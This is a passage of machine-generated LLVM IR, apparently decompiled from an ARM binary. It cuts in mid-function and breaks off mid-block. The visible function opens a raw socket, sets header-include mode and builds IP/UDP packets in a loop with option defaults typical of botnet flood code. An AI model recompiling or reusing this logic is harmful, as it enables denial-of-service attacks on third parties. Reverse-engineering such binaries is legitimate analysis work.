  uselistorder i32 %v3_a9c4, { 2, 1, 0 }
  uselistorder i32 %v3_a9c0, { 2, 1, 0 }
  uselistorder i32 %v3_a9ac, { 2, 1, 0 }
  uselistorder i32 %v3_a98c, { 1, 0 }
  uselistorder i32 %v1_a984, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 %v0_a974, { 1, 0 }
  uselistorder i1 %v7_a964, { 1, 0 }
  uselistorder i1 %v7_a938, { 1, 0 }
  uselistorder i32 %v3_a934, { 5, 1, 3, 4, 2, 0, 6 }
  uselistorder i32 %v5_a920, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v5_a8cc, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_a880, { 1, 0, 2 }
  uselistorder i8 %v5_a838, { 2, 0, 1 }
  uselistorder i32 %v2_a800, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 15, 3, 9, 10, 11, 12, 13, 14, 16, 4, 5, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 31, 32, 33, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 24, 25, 26, 27, 28, 19, 20, 21, 22, 23, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38, 39, 40, 41, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 17, 18, 14, 15, 16, 19, 20, 21, 23, 22, 24, 25, 27, 26, 28, 29, 31, 30, 33, 32, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 5, 6, 4, 7, 9, 8, 10, 13, 11, 12, 15, 14, 16, 18, 17, 19, 20, 21, 22, 24, 23, 25, 27, 26, 29, 28, 44, 43, 45, 48, 46, 31, 30, 32, 33, 34, 36, 35, 37, 39, 38, 40, 41, 42, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 18, 19, 14, 15, 16, 17, 20, 21, 22 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_aca8, { 1, 0 }
  uselistorder label %dec_label_pc_ac44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_abbc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_abbc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_ab98, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_aa88, { 1, 0 }
  uselistorder label %dec_label_pc_a9e8, { 1, 0 }
}

define i32 @function_ae40(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ae40:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_ae40 = load i32, i32* @r4, align 4
  %v18_ae40 = load i32, i32* @sb, align 4
  %v24_ae40 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sl, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_ae5c = call i32 @function_13258(i32 %arg1, i32 4)
  %v0_ae60 = load i32, i32* @r5, align 4
  store i32 %v0_ae60, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ae70 = load i32, i32* @r4, align 4
  %v5_ae74 = inttoptr i32 %v0_ae60 to i32*
  %v6_ae74 = call i32 @function_a430(i32 %v0_ae70, i32* %v5_ae74, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_ae8c = load i32, i32* @r5, align 4
  store i32 %v0_ae8c, i32* %r1.global-to-local, align 4
  %v0_ae90 = load i32, i32* @r4, align 4
  %v5_ae94 = trunc i32 %v6_ae74 to i8
  %v6_ae98 = inttoptr i32 %v0_ae8c to i32*
  %v7_ae98 = call i32 @function_a430(i32 %v0_ae90, i32* %v6_ae98, i32 3, i32 65535)
  %v0_ae9c = load i32, i32* @r5, align 4
  store i32 %v0_ae9c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_ae98, i32* %fp.global-to-local, align 4
  %v0_aeac = load i32, i32* @r4, align 4
  %v4_aeb0 = inttoptr i32 %v0_ae9c to i32*
  %v5_aeb0 = call i32 @function_a430(i32 %v0_aeac, i32* %v4_aeb0, i32 4, i32 64)
  %v0_aebc = load i32, i32* @r5, align 4
  store i32 %v0_aebc, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_aec8 = load i32, i32* @r4, align 4
  %v6_aed0 = inttoptr i32 %v0_aebc to i32*
  %v7_aed0 = call i32 @function_a430(i32 %v0_aec8, i32* %v6_aed0, i32 5, i32 1)
  %v1_aedc = urem i32 %v7_aed0, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_aee8 = load i32, i32* @r5, align 4
  store i32 %v0_aee8, i32* %r1.global-to-local, align 4
  %v0_aeec = load i32, i32* @r4, align 4
  %v5_aef4 = inttoptr i32 %v0_aee8 to i32*
  %v6_aef4 = call i32 @function_a430(i32 %v0_aeec, i32* %v5_aef4, i32 6, i32 65535)
  %v0_aefc = load i32, i32* @r5, align 4
  store i32 %v0_aefc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_aef4, i32* %sb.global-to-local, align 4
  %v0_af0c = load i32, i32* @r4, align 4
  %v4_af10 = inttoptr i32 %v0_aefc to i32*
  %v5_af10 = call i32 @function_a430(i32 %v0_af0c, i32* %v4_af10, i32 7, i32 65535)
  %v0_af14 = load i32, i32* @r5, align 4
  store i32 %v0_af14, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_af10, i32* @r7, align 4
  %v0_af24 = load i32, i32* @r4, align 4
  %v4_af28 = inttoptr i32 %v0_af14 to i32*
  %v5_af28 = call i32 @function_a430(i32 %v0_af24, i32* %v4_af28, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_af38 = load i32, i32* @r5, align 4
  store i32 %v0_af38, i32* %r1.global-to-local, align 4
  %v0_af3c = load i32, i32* @r4, align 4
  %v4_af40 = inttoptr i32 %v0_af38 to i32*
  %v5_af40 = call i32 @function_a430(i32 %v0_af3c, i32* %v4_af40, i32 1, i32 1)
  %v1_af48 = urem i32 %v5_af40, 256
  %v0_af4c = load i32, i32* @r5, align 4
  store i32 %v0_af4c, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_af58 = load i32, i32* @r4, align 4
  %v5_af60 = inttoptr i32 %v0_af4c to i32*
  %v6_af60 = call i32 @function_a430(i32 %v0_af58, i32* %v5_af60, i32 19, i32 0)
  %v0_af68 = load i32, i32* @r5, align 4
  store i32 %v0_af68, i32* %r1.global-to-local, align 4
  %v2_af6c = load i32, i32* @global_var_2295c.90, align 4
  store i32 %v2_af6c, i32* %r3.global-to-local, align 4
  store i32 %v6_af60, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_af78 = load i32, i32* @r4, align 4
  %v4_af7c = inttoptr i32 %v0_af68 to i32*
  %v5_af7c = call i32 @function_a430(i32 %v0_af78, i32* %v4_af7c, i32 25, i32 %v2_af6c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_af90 = call i32 @function_14ba0(i32 2, i32 3, i32 6)
  store i32 %v3_af90, i32* @r0, align 4
  %v7_af94 = icmp eq i32 %v3_af90, -1
  store i1 %v7_af94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_af94, label %dec_label_pc_b1d4, label %dec_label_pc_afa0

dec_label_pc_afa0:                                ; preds = %dec_label_pc_ae40
  store i32 1, i32* %stack_var_-44, align 4
  %v6_afa8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_afa8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* @r2, align 4
  %v5_afbc = call i32 @function_14b30(i32 %v3_af90, i32 0, i32 3, i32 %v6_afa8, i32 4)
  %v7_afc0 = icmp eq i32 %v5_afbc, -1
  store i1 %v7_afc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_afc0, label %dec_label_pc_b1cc, label %dec_label_pc_afc8

dec_label_pc_afc8:                                ; preds = %dec_label_pc_afa0
  %v0_afc8 = load i32, i32* %sb.global-to-local, align 4
  %v0_afcc = load i32, i32* @r7, align 4
  %v0_afd0 = load i32, i32* %fp.global-to-local, align 4
  %v3_afd0 = mul i32 %v0_afd0, 65536
  store i32 %v3_afd0, i32* %r3.global-to-local, align 4
  %v3_afd8 = urem i32 %v0_afc8, 65536
  store i32 %v3_afd8, i32* %r2.global-to-local, align 4
  %v3_afdc = urem i32 %v0_afcc, 65536
  store i32 %v3_afdc, i32* %r1.global-to-local, align 4
  %v0_afe0 = load i32, i32* @r6, align 4
  %v1_afe0 = urem i32 %v0_afe0, 256
  store i32 %v1_afe0, i32* @r6, align 4
  %v0_afe4 = load i32, i32* @r8, align 4
  %v2_afe4 = icmp eq i32 %v0_afe4, 0
  store i1 %v2_afe4, i1* %cpsr_z.global-to-local, align 1
  %v3_afe8 = urem i32 %v0_afd0, 65536
  store i32 %v3_afe8, i32* @sb, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_afe4, label %dec_label_pc_b404, label %dec_label_pc_b000

dec_label_pc_b000:                                ; preds = %dec_label_pc_afc8
  %v3_b008 = mul i32 %v5_af28, 65536
  %v1_b00c = add i32 %v3_b008, 524288
  %v1_b010 = add i32 %v3_b008, 3407872
  %v1_b018 = add i32 %v3_b008, 1835008
  %v3_b01c = udiv i32 %v1_b010, 65536
  store i32 %v3_b01c, i32* %r1.global-to-local, align 4
  %v3_b020 = udiv i32 %v1_b018, 65536
  store i32 %v3_b020, i32* %r3.global-to-local, align 4
  %v3_b024 = xor i32 %v3_afe8, 65535
  store i32 %v3_b024, i32* %r2.global-to-local, align 4
  %v3_b028 = udiv i32 %v1_b00c, 65536
  store i32 %v3_b028, i32* @fp, align 4
  store i32 0, i32* @r4, align 4
  %v4_b16c = sext i8 %v5_ae94 to i32
  %v2_b190 = icmp eq i32 %v1_aedc, 0
  %v2_b0dc = icmp eq i32 %v1_afe0, 0
  %sext = mul i32 %v5_aeb0, 16777216
  %v4_b18c = sdiv i32 %sext, 16777216
  br label %dec_label_pc_b12c

dec_label_pc_b040:                                ; preds = %dec_label_pc_b12c, %dec_label_pc_b1ac
  %v2_b044 = phi i32 [ %v0_b19c, %dec_label_pc_b12c ], [ %v2_b044.pre, %dec_label_pc_b1ac ]
  %v3_b044 = add i32 %v2_b044, 9
  %v4_b044 = inttoptr i32 %v3_b044 to i8*
  store i8 47, i8* %v4_b044, align 1
  %v3_b048 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b048, i32* %r2.global-to-local, align 4
  store i32 %v5_af7c, i32* %r1.global-to-local, align 4
  %v3_b050 = mul i32 %v3_b048, 32
  store i32 %v3_b050, i32* %r3.global-to-local, align 4
  %v1_b054 = load i32, i32* %r4.global-to-local, align 4
  %v2_b054 = add i32 %v1_b054, 12
  %v3_b054 = inttoptr i32 %v2_b054 to i32*
  store i32 %v5_af7c, i32* %v3_b054, align 4
  %v0_b058 = load i32, i32* %r3.global-to-local, align 4
  %v1_b058 = load i32, i32* %r2.global-to-local, align 4
  %tmp = mul i32 %v1_b058, -8
  %v5_b058 = add i32 %v0_b058, %tmp
  %v1_b05c = load i32, i32* @sl, align 4
  %v2_b05c = add i32 %v1_b05c, %v5_b058
  store i32 %v2_b05c, i32* %r3.global-to-local, align 4
  %v1_b060 = add i32 %v2_b05c, 16
  %v2_b060 = inttoptr i32 %v1_b060 to i32*
  %v3_b060 = load i32, i32* %v2_b060, align 4
  store i32 %v3_b060, i32* %r2.global-to-local, align 4
  %v1_b068 = load i32, i32* %r4.global-to-local, align 4
  %v2_b068 = add i32 %v1_b068, 16
  %v3_b068 = inttoptr i32 %v2_b068 to i32*
  store i32 %v3_b060, i32* %v3_b068, align 4
  %v1_b06c = call i32 @function_14898(i32 2048)
  %v2_b06c = trunc i32 %v1_b06c to i16
  %v3_b070 = load i32, i32* @r7, align 4
  %v4_b070 = add i32 %v3_b070, 2
  %v5_b070 = inttoptr i32 %v4_b070 to i16*
  store i16 %v2_b06c, i16* %v5_b070, align 2
  %v0_b074 = load i32, i32* %r4.global-to-local, align 4
  %v1_b074 = add i32 %v0_b074, 24
  %v2_b074 = inttoptr i32 %v1_b074 to i8*
  %v3_b074 = load i8, i8* %v2_b074, align 1
  %tmp53 = urem i8 %v3_b074, 16
  %v1_b078 = zext i8 %tmp53 to i32
  %v1_b07c = or i32 %v1_b078, 64
  store i32 %v1_b07c, i32* %r3.global-to-local, align 4
  %v1_b080 = trunc i32 %v1_b07c to i8
  store i8 %v1_b080, i8* %v2_b074, align 1
  %v0_b084 = load i32, i32* %r4.global-to-local, align 4
  %v1_b084 = add i32 %v0_b084, 24
  %v2_b084 = inttoptr i32 %v1_b084 to i8*
  %v3_b084 = load i8, i8* %v2_b084, align 1
  %v1_b088 = and i8 %v3_b084, -16
  %v1_b08c = or i8 %v1_b088, 5
  store i8 %v1_b08c, i8* %v2_b084, align 1
  store i32 %v4_b16c, i32* %r2.global-to-local, align 4
  %v2_b098 = load i32, i32* @r5, align 4
  %v3_b098 = add i32 %v2_b098, 1
  %v4_b098 = inttoptr i32 %v3_b098 to i8*
  store i8 %v5_ae94, i8* %v4_b098, align 1
  %v1_b0a0 = call i32 @function_14898(i32 %v3_b020)
  %v2_b0a0 = trunc i32 %v1_b0a0 to i16
  %v3_b0a4 = load i32, i32* @r5, align 4
  %v4_b0a4 = add i32 %v3_b0a4, 2
  %v5_b0a4 = inttoptr i32 %v4_b0a4 to i16*
  store i16 %v2_b0a0, i16* %v5_b0a4, align 2
  %v1_b0ac = call i32 @function_14898(i32 %v3_b024)
  %v2_b0ac = trunc i32 %v1_b0ac to i16
  store i32 %v4_b18c, i32* %r1.global-to-local, align 4
  store i32 %v1_aedc, i32* %r3.global-to-local, align 4
  store i1 %v2_b190, i1* %cpsr_z.global-to-local, align 1
  %v3_b0bc = load i32, i32* @r5, align 4
  %v4_b0bc = add i32 %v3_b0bc, 4
  %v5_b0bc = inttoptr i32 %v4_b0bc to i16*
  store i16 %v2_b0ac, i16* %v5_b0bc, align 2
  %v0_b0c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_b0c0 = trunc i32 %v0_b0c0 to i8
  %v2_b0c0 = load i32, i32* @r5, align 4
  %v3_b0c0 = add i32 %v2_b0c0, 8
  %v4_b0c0 = inttoptr i32 %v3_b0c0 to i8*
  store i8 %v1_b0c0, i8* %v4_b0c0, align 1
  %v0_b0c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b0c4, label %dec_label_pc_b0c8, label %dec_label_pc_b1bc

dec_label_pc_b0c8:                                ; preds = %dec_label_pc_b040, %dec_label_pc_b1bc
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_b0cc = load i32, i32* @r5, align 4
  %v3_b0cc = add i32 %v2_b0cc, 9
  %v4_b0cc = inttoptr i32 %v3_b0cc to i8*
  store i8 17, i8* %v4_b0cc, align 1
  %v0_b0d0 = call i32 @function_f570()
  store i32 %v1_afe0, i32* %r2.global-to-local, align 4
  store i1 %v2_b0dc, i1* %cpsr_z.global-to-local, align 1
  %v1_b0e0 = sub i32 1023, %v0_b0d0
  store i32 %v1_b0e0, i32* %r3.global-to-local, align 4
  br i1 %v2_b0dc, label %.thread, label %.thread3

.thread:                                          ; preds = %dec_label_pc_b0c8
  %v2_b0e8 = load i32, i32* @r5, align 4
  %v3_b0e8 = add i32 %v2_b0e8, 16
  %v4_b0e8 = inttoptr i32 %v3_b0e8 to i32*
  store i32 %v1_b0e0, i32* %v4_b0e8, align 4
  br label %bb

.thread3:                                         ; preds = %dec_label_pc_b0c8
  %v1_b0e4 = load i32, i32* %r4.global-to-local, align 4
  %v2_b0e4 = add i32 %v1_b0e4, 16
  %v3_b0e4 = inttoptr i32 %v2_b0e4 to i32*
  %v4_b0e4 = load i32, i32* %v3_b0e4, align 4
  store i32 %v4_b0e4, i32* %r3.global-to-local, align 4
  %v2_b0ec = load i32, i32* @r5, align 4
  %v3_b0ec = add i32 %v2_b0ec, 16
  %v4_b0ec = inttoptr i32 %v3_b0ec to i32*
  store i32 %v4_b0e4, i32* %v4_b0ec, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread3
  %v1_b0f0 = load i32, i32* @r5, align 4
  %v2_b0f0 = add i32 %v1_b0f0, 12
  %v3_b0f0 = inttoptr i32 %v2_b0f0 to i32*
  store i32 %v0_b0d0, i32* %v3_b0f0, align 4
  %v1_b0f8 = call i32 @function_14898(i32 %v3_afd8)
  %v2_b0f8 = trunc i32 %v1_b0f8 to i16
  %v3_b0fc = load i32, i32* @r6, align 4
  %v4_b0fc = inttoptr i32 %v3_b0fc to i16*
  store i16 %v2_b0f8, i16* %v4_b0fc, align 2
  %v1_b104 = call i32 @function_14898(i32 %v3_afdc)
  %v2_b104 = trunc i32 %v1_b104 to i16
  %v3_b108 = load i32, i32* @r6, align 4
  %v4_b108 = add i32 %v3_b108, 2
  %v5_b108 = inttoptr i32 %v4_b108 to i16*
  store i16 %v2_b104, i16* %v5_b108, align 2
  %v0_b10c = load i32, i32* @fp, align 4
  %v1_b110 = call i32 @function_14898(i32 %v0_b10c)
  %v2_b110 = trunc i32 %v1_b110 to i16
  %v3_b114 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b114, i32* %r3.global-to-local, align 4
  %v1_b118 = add i32 %v3_b114, 1
  store i32 %v1_b118, i32* @r4, align 4
  %v1_b11c = load i32, i32* @r8, align 4
  %v9_b11c = icmp eq i32 %v1_b118, %v1_b11c
  store i1 %v9_b11c, i1* %cpsr_z.global-to-local, align 1
  %v3_b120 = load i32, i32* @r6, align 4
  %v4_b120 = add i32 %v3_b120, 4
  %v5_b120 = inttoptr i32 %v4_b120 to i16*
  store i16 %v2_b110, i16* %v5_b120, align 2
  %v0_b124 = load i32, i32* @r4, align 4
  store i32 %v0_b124, i32* %stack_var_-44, align 4
  %v6_b128 = icmp slt i32 %v1_b118, %v1_b11c
  br i1 %v6_b128, label %dec_label_pc_b12c, label %dec_label_pc_b1e0

dec_label_pc_b12c:                                ; preds = %bb, %dec_label_pc_b000
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_b138 = call i32 @function_13258(i32 1510, i32 4)
  store i32 %v2_ae5c, i32* %r2.global-to-local, align 4
  %v3_b140 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b140, i32* %r3.global-to-local, align 4
  %v2_b144 = load i32, i32* @r4, align 4
  %v5_b144 = mul i32 %v2_b144, 4
  %v6_b144 = add i32 %v5_b144, %v2_ae5c
  %v7_b144 = inttoptr i32 %v6_b144 to i32*
  store i32 %v2_b138, i32* %v7_b144, align 4
  %v0_b148 = load i32, i32* %r2.global-to-local, align 4
  %v1_b148 = load i32, i32* %r3.global-to-local, align 4
  %v4_b148 = mul i32 %v1_b148, 4
  %v5_b148 = add i32 %v4_b148, %v0_b148
  %v6_b148 = inttoptr i32 %v5_b148 to i32*
  %v7_b148 = load i32, i32* %v6_b148, align 4
  store i32 %v7_b148, i32* %r4.global-to-local, align 4
  %v1_b14c = inttoptr i32 %v7_b148 to i8*
  %v2_b14c = load i8, i8* %v1_b14c, align 1
  %tmp54 = urem i8 %v2_b14c, 16
  %v1_b150 = zext i8 %tmp54 to i32
  %v1_b154 = or i32 %v1_b150, 64
  store i32 %v1_b154, i32* %r2.global-to-local, align 4
  %v1_b158 = trunc i32 %v1_b154 to i8
  store i8 %v1_b158, i8* %v1_b14c, align 1
  %v0_b15c = load i32, i32* %r4.global-to-local, align 4
  %v1_b15c = inttoptr i32 %v0_b15c to i8*
  %v2_b15c = load i8, i8* %v1_b15c, align 1
  %v1_b160 = and i8 %v2_b15c, -16
  %v1_b164 = or i8 %v1_b160, 5
  store i8 %v1_b164, i8* %v1_b15c, align 1
  store i32 %v4_b16c, i32* %r3.global-to-local, align 4
  %v2_b170 = load i32, i32* %r4.global-to-local, align 4
  %v3_b170 = add i32 %v2_b170, 1
  %v4_b170 = inttoptr i32 %v3_b170 to i8*
  store i8 %v5_ae94, i8* %v4_b170, align 1
  %v1_b178 = call i32 @function_14898(i32 %v3_b01c)
  %v2_b178 = trunc i32 %v1_b178 to i16
  %v3_b17c = load i32, i32* %r4.global-to-local, align 4
  %v4_b17c = add i32 %v3_b17c, 2
  %v5_b17c = inttoptr i32 %v4_b17c to i16*
  store i16 %v2_b178, i16* %v5_b17c, align 2
  %v0_b180 = load i32, i32* @sb, align 4
  %v1_b184 = call i32 @function_14898(i32 %v0_b180)
  %v2_b184 = trunc i32 %v1_b184 to i16
  store i32 %v1_aedc, i32* %r1.global-to-local, align 4
  store i32 %v4_b18c, i32* %r2.global-to-local, align 4
  store i1 %v2_b190, i1* %cpsr_z.global-to-local, align 1
  %v3_b194 = load i32, i32* %r4.global-to-local, align 4
  %v4_b194 = add i32 %v3_b194, 4
  %v5_b194 = inttoptr i32 %v4_b194 to i16*
  store i16 %v2_b184, i16* %v5_b194, align 2
  %v0_b198 = load i32, i32* %r2.global-to-local, align 4
  %v1_b198 = trunc i32 %v0_b198 to i8
  %v2_b198 = load i32, i32* %r4.global-to-local, align 4
  %v3_b198 = add i32 %v2_b198, 8
  %v4_b198 = inttoptr i32 %v3_b198 to i8*
  store i8 %v1_b198, i8* %v4_b198, align 1
  %v0_b19c = load i32, i32* %r4.global-to-local, align 4
  %v1_b19c = add i32 %v0_b19c, 24
  store i32 %v1_b19c, i32* @r5, align 4
  %v1_b1a0 = add i32 %v0_b19c, 44
  store i32 %v1_b1a0, i32* @r6, align 4
  %v1_b1a4 = add i32 %v0_b19c, 20
  store i32 %v1_b1a4, i32* @r7, align 4
  %v0_b1a8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b1a8, label %dec_label_pc_b040, label %dec_label_pc_b1ac

dec_label_pc_b1ac:                                ; preds = %dec_label_pc_b12c
  %v1_b1b0 = call i32 @function_14898(i32 16384)
  %v2_b1b0 = trunc i32 %v1_b1b0 to i16
  %v3_b1b4 = load i32, i32* %r4.global-to-local, align 4
  %v4_b1b4 = add i32 %v3_b1b4, 6
  %v5_b1b4 = inttoptr i32 %v4_b1b4 to i16*
  store i16 %v2_b1b0, i16* %v5_b1b4, align 2
  %v2_b044.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b040

dec_label_pc_b1bc:                                ; preds = %dec_label_pc_b040
  %v1_b1c0 = call i32 @function_14898(i32 16384)
  %v2_b1c0 = trunc i32 %v1_b1c0 to i16
  %v3_b1c4 = load i32, i32* @r5, align 4
  %v4_b1c4 = add i32 %v3_b1c4, 6
  %v5_b1c4 = inttoptr i32 %v4_b1c4 to i16*
  store i16 %v2_b1c0, i16* %v5_b1c4, align 2
  br label %dec_label_pc_b0c8

dec_label_pc_b1cc:                                ; preds = %dec_label_pc_afa0
  store i32 %v3_af90, i32* @r0, align 4
  %v1_b1d0 = call i32 @function_15b6c(i32 %v3_af90)
  br label %dec_label_pc_b1d4

dec_label_pc_b1d4:                                ; preds = %dec_label_pc_ae40, %dec_label_pc_b1cc
  %v1_b1dc = phi i32 [ %v3_af90, %dec_label_pc_ae40 ], [ %v1_b1d0, %dec_label_pc_b1cc ]
  store i32 %v3_ae40, i32* %r4.global-to-local, align 4
  store i32 %v18_ae40, i32* %sb.global-to-local, align 4
  store i32 %v24_ae40, i32* %fp.global-to-local, align 4
  ret i32 %v1_b1dc

dec_label_pc_b1e0:                                ; preds = %bb
  store i32 %v5_af28, i32* %r1.global-to-local, align 4
  %v1_b1e8 = add i32 %v5_af28, 8
  store i32 %v1_b1e8, i32* %r3.global-to-local, align 4
  %v0_b1f8.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_b1f4.preheader

dec_label_pc_b1f4.preheader:                      ; preds = %dec_label_pc_b1e0, %dec_label_pc_b404
  %v0_b1f8.pre = phi i32 [ %v0_b1f8.pre.pre, %dec_label_pc_b1e0 ], [ 0, %dec_label_pc_b404 ]
  %stack_var_-108.0.ph = phi i32 [ %v1_b1e8, %dec_label_pc_b1e0 ], [ %v1_b40c, %dec_label_pc_b404 ]
  %storemerge = add i32 %v5_af28, 52
  store i32 %storemerge, i32* %fp.global-to-local, align 4
  %v3_b364 = icmp eq i32 %v5_af7c, -1
  %v8_b364 = icmp eq i32 %v5_af7c, -1
  %v2_b3cc = icmp eq i32 %v1_afe0, 0
  %v2_b3e8 = icmp eq i32 %v1_af48, 0
  br label %dec_label_pc_b1f4

dec_label_pc_b1f4:                                ; preds = %dec_label_pc_b1f4, %dec_label_pc_b284, %dec_label_pc_b1f4.preheader
  %v0_b1f8 = phi i32 [ %v0_b1f8.pre, %dec_label_pc_b1f4.preheader ], [ 0, %dec_label_pc_b1f4 ], [ %v1_b324, %dec_label_pc_b284 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b1f8 = icmp eq i32 %v0_b1f8, 0
  store i1 %v2_b1f8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b1f8, label %dec_label_pc_b1f4, label %dec_label_pc_b204

dec_label_pc_b204:                                ; preds = %dec_label_pc_b1f4
  br label %dec_label_pc_b208

dec_label_pc_b208:                                ; preds = %dec_label_pc_b284, %dec_label_pc_b204
  %v1_b21c = phi i32 [ %v1_b320, %dec_label_pc_b284 ], [ 0, %dec_label_pc_b204 ]
  %v5_b20c = mul i32 %v1_b21c, 24
  %v1_b210 = load i32, i32* @sl, align 4
  %v2_b210 = add i32 %v1_b210, %v5_b20c
  store i32 %v2_b210, i32* %r3.global-to-local, align 4
  store i32 %v2_ae5c, i32* %r1.global-to-local, align 4
  %v1_b218 = add i32 %v2_b210, 20
  %v2_b218 = inttoptr i32 %v1_b218 to i8*
  %v3_b218 = load i8, i8* %v2_b218, align 1
  %v4_b218 = zext i8 %v3_b218 to i32
  store i32 %v4_b218, i32* %r2.global-to-local, align 4
  %v4_b21c = mul i32 %v1_b21c, 4
  %v5_b21c = add i32 %v4_b21c, %v2_ae5c
  %v6_b21c = inttoptr i32 %v5_b21c to i32*
  %v7_b21c = load i32, i32* %v6_b21c, align 4
  store i32 %v7_b21c, i32* @r5, align 4
  %v7_b220 = icmp eq i8 %v3_b218, 31
  store i1 %v7_b220, i1* %cpsr_z.global-to-local, align 1
  %v1_b224 = add i32 %v7_b21c, 24
  store i32 %v1_b224, i32* @r6, align 4
  %v1_b228 = add i32 %v7_b21c, 44
  store i32 %v1_b228, i32* @r7, align 4
  %tmp55 = icmp ult i8 %v3_b218, 32
  br i1 %tmp55, label %dec_label_pc_b334, label %dec_label_pc_b230

dec_label_pc_b230:                                ; preds = %dec_label_pc_b208
  store i32 %v5_af7c, i32* %r2.global-to-local, align 4
  store i1 %v8_b364, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_b364, label %dec_label_pc_b370, label %dec_label_pc_b23c

dec_label_pc_b23c:                                ; preds = %dec_label_pc_b334, %dec_label_pc_b230
  store i32 65535, i32* @r4, align 4
  %v0_b244 = load i32, i32* @sb, align 4
  %v9_b244 = icmp eq i32 %v0_b244, 65535
  store i1 %v9_b244, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b244, label %dec_label_pc_b388, label %dec_label_pc_b24c

dec_label_pc_b24c:                                ; preds = %dec_label_pc_b370.dec_label_pc_b24c_crit_edge, %dec_label_pc_b23c
  %v1_b250 = phi i32 [ %v1_b250.pre, %dec_label_pc_b370.dec_label_pc_b24c_crit_edge ], [ 65535, %dec_label_pc_b23c ]
  store i32 %v3_afd8, i32* %r3.global-to-local, align 4
  %v9_b250 = icmp eq i32 %v3_afd8, %v1_b250
  store i1 %v9_b250, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b250, label %dec_label_pc_b3b0, label %dec_label_pc_b258

dec_label_pc_b258:                                ; preds = %dec_label_pc_b388, %dec_label_pc_b24c
